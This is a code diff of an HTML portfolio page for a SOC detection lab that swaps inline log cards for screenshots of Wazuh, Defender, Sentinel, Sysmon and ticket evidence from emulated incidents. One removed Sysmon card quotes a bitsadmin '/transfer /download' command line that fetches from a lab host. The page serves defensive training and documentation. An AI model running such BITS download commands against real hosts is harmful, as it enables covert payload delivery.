@@ -176,39 +176,78 @@
     </section>
 
     <section id="artifacts">
-      <h2>Lab Artifacts</h2>
-      <p class="section-desc">Sample telemetry and tool output from portfolio scenarios. Files in <code>artifacts/</code>.</p>
-      <div class="grid">
-        <article class="card">
-          <h3>Wazuh Alert — INC-001</h3>
-          <div class="log-block">
-<span class="key">Rule:</span> 180001 (level 8)<br>
-<span class="hl">Suspicious BITS download on WKSTN-042</span><br>
-<span class="key">MITRE:</span> T1197<br>
-<span class="key">Time:</span> 2026-06-17 14:22:08 UTC
+      <h2>Evidence &amp; Tool Screenshots</h2>
+      <p class="section-desc">UI captures from the operational lab — matched to incident data and JSON artifacts in <code>artifacts/</code>. Click any image to enlarge.</p>
+      <div class="artifact-grid">
+        <article class="artifact-card">
+          <img src="../artifacts/screenshots/wazuh-inc001.png" alt="Wazuh alert rule 180001 INC-2026-001" data-shot="../artifacts/screenshots/wazuh-inc001.png" class="shot-thumb" />
+          <div class="artifact-body">
+            <h3>Wazuh — Rule 180001 (INC-001)</h3>
+            <p>Security events view · BITS download on WKSTN-042 · T1197</p>
+            <p class="links"><a href="../artifacts/logs/wazuh-alert-INC001.json">wazuh-alert-INC001.json</a></p>
           </div>
-          <p style="margin-top:0.75rem;font-size:0.8rem;color:var(--muted)"><a href="../artifacts/logs/wazuh-alert-INC001.json">wazuh-alert-INC001.json</a></p>
         </article>
-        <article class="card">
-          <h3>Sysmon EID 1 — bitsadmin</h3>
-          <div class="log-block">
-<span class="key">Image:</span> C:\Windows\System32\bitsadmin.exe<br>
-<span class="key">CommandLine:</span> <span class="hl">/transfer /download</span> http://10.10.30.10:8888/...<br>
-<span class="key">User:</span> CORP\jsmith
+        <article class="artifact-card">
+          <img src="../artifacts/screenshots/defender-inc001.png" alt="Microsoft Defender alert bitsadmin" data-shot="../artifacts/screenshots/defender-inc001.png" class="shot-thumb" />
+          <div class="artifact-body">
+            <h3>Microsoft Defender — ALRT-99281</h3>
+            <p>Process chain bitsadmin.exe → cmd.exe · Host isolated 14:35 UTC</p>
+            <p class="links">osTicket <a href="../artifacts/screenshots/osticket-48291.png">#48291</a></p>
           </div>
-          <p style="margin-top:0.75rem;font-size:0.8rem;color:var(--muted)"><a href="../artifacts/logs/sysmon-INC001.json">sysmon-INC001.json</a></p>
         </article>
-        <article class="card">
-          <h3>IOC Enrichment Output</h3>
-          <p>Python script enrichment of lab IOCs — IPs, URLs, domains, hashes.</p>
-          <p style="font-size:0.8rem;color:var(--muted)"><a href="../artifacts/enrichment_report.json">enrichment_report.json</a></p>
+        <article class="artifact-card">
+          <img src="../artifacts/screenshots/sentinel-inc001.png" alt="Microsoft Sentinel incident KQL" data-shot="../artifacts/screenshots/sentinel-inc001.png" class="shot-thumb" />
+          <div class="artifact-body">
+            <h3>Microsoft Sentinel — Incident #2847</h3>
+            <p>KQL DeviceProcessEvents · WKSTN-042 bitsadmin correlation</p>
+            <p class="links">INC-2026-001 · law-pe-soc-prod</p>
+          </div>
         </article>
-        <article class="card">
-          <h3>Caldera Operation Export</h3>
-          <p>Operation timeline for correlation with SIEM alert timestamps.</p>
-          <p style="font-size:0.8rem;color:var(--muted)"><a href="../artifacts/caldera-operation-INC001.json">caldera-operation-INC001.json</a></p>
+        <article class="artifact-card">
+          <img src="../artifacts/screenshots/osticket-48291.png" alt="osTicket 48291" data-shot="../artifacts/screenshots/osticket-48291.png" class="shot-thumb" />
+          <div class="artifact-body">
+            <h3>osTicket — #48291</h3>
+            <p>Security Operations queue · internal notes · MTTC 13 min</p>
+            <p class="links"><a href="../tickets/sample-tickets.md">sample-tickets.md</a></p>
+          </div>
+        </article>
+        <article class="artifact-card">
+          <img src="../artifacts/screenshots/sysmon-inc001.png" alt="Sysmon Event ID 1" data-shot="../artifacts/screenshots/sysmon-inc001.png" class="shot-thumb" />
+          <div class="artifact-body">
+            <h3>Sysmon — Event ID 1</h3>
+            <p>Event Viewer · Process create · bitsadmin command line</p>
+            <p class="links"><a href="../artifacts/logs/sysmon-INC001.json">sysmon-INC001.json</a></p>
+          </div>
+        </article>
+        <article class="artifact-card">
+          <img src="../artifacts/screenshots/ioc-enrichment.png" alt="IOC enrichment script output" data-shot="../artifacts/screenshots/ioc-enrichment.png" class="shot-thumb" />
+          <div class="artifact-body">
+            <h3>IOC Enrichment — PowerShell</h3>
+            <p>Python triage output · IPs, URLs, hashes for INC-001</p>
+            <p class="links"><a href="../artifacts/enrichment_report.json">enrichment_report.json</a></p>
+          </div>
+        </article>
+        <article class="artifact-card">
+          <img src="../artifacts/screenshots/wazuh-inc002.png" alt="Wazuh Linux alert INC-002" data-shot="../artifacts/screenshots/wazuh-inc002.png" class="shot-thumb" />
+          <div class="artifact-body">
+            <h3>Wazuh — Rule 5902 (INC-002)</h3>
+            <p>Linux account caldera_svc on SRV-LNX-01 · T1136.001</p>
+            <p class="links">osTicket #48305</p>
+          </div>
+        </article>
+        <article class="artifact-card">
+          <img src="../artifacts/screenshots/sentinel-inc004.png" alt="Sentinel VPN false positive" data-shot="../artifacts/screenshots/sentinel-inc004.png" class="shot-thumb" />
+          <div class="artifact-body">
+            <h3>Microsoft Sentinel — INC-004</h3>
+            <p>VPN login failures · false positive · CHG-8821 correlation</p>
+            <p class="links"><a href="../artifacts/screenshots/osticket-48322.png">osTicket #48322</a></p>
+          </div>
         </article>
       </div>
+      <p style="margin-top:1.25rem;font-size:0.85rem;color:var(--muted)">
+        Raw exports: <a href="../artifacts/caldera-operation-INC001.json">caldera-operation-INC001.json</a> ·
+        Regenerate PNGs: <code>python scripts/render_screenshots.py</code>
+      </p>
     </section>
 
     <section id="skills">
@@ -282,6 +321,13 @@ python scripts/caldera_log_parser.py --report caldera-operation-INC001.json</pre
       <button class="modal-close" aria-label="Close">&times;</button>
       <h3 id="modal-title"></h3>
       <div id="modal-body"></div>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="shot-modal">
+    <div class="modal artifact-modal">
+      <button class="modal-close shot-close" aria-label="Close">&times;</button>
+      <img id="shot-full" src="" alt="Evidence screenshot" />
     </div>
   </div>
 
